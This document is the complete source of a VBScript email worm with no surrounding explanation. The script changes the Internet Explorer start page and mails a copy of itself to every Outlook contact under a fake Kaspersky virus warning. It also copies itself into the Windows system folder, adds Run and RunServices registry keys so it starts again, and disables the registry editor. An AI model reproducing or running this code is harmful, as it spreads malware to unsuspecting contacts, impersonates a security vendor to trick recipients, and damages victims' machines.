Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")
s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.yandex.ru"
ie.Visible = True
ie.Navigate "http:\\www.rambler.ru"

For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = oe.CreateItem(0)
OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Kaspersky"
OutMail.Body = "Virus is found In your letter! Request to install Kaspersky Anti-Virus "
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next
Set File2 = f.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\WINDOWS\system\syser.vbs")
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\syser", "C:\WINDOWS\system\syser.vbs"
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\syser", "C:\WINDOWS\system\syser.vbs"

s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"